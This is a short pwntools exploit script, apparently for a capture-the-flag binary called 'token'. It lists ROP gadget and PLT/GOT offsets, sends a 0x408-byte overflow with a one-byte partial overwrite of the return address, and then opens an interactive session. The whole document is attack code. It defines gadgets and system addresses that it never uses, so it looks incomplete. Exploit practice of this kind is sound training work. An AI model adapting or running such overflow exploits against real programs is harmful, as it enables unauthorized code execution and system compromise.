from pwn import * #64

p = process("./token")

e = ELF("./token")
libc = e.libc
pop_rdi = 0x12c3
pop_rsi_r15 = 0x12c1
write_plt = 0x1080
write_got = 0x33a0
system_plt = 0x1090
system_got = 0x33a8
p.recvuntil(b"buf:")

payload = b"A"*0x408
payload+= b"\xac"

p.send(payload)
p.recvuntil(b"buf:")
p.sendline(b"A")
p.interactive()
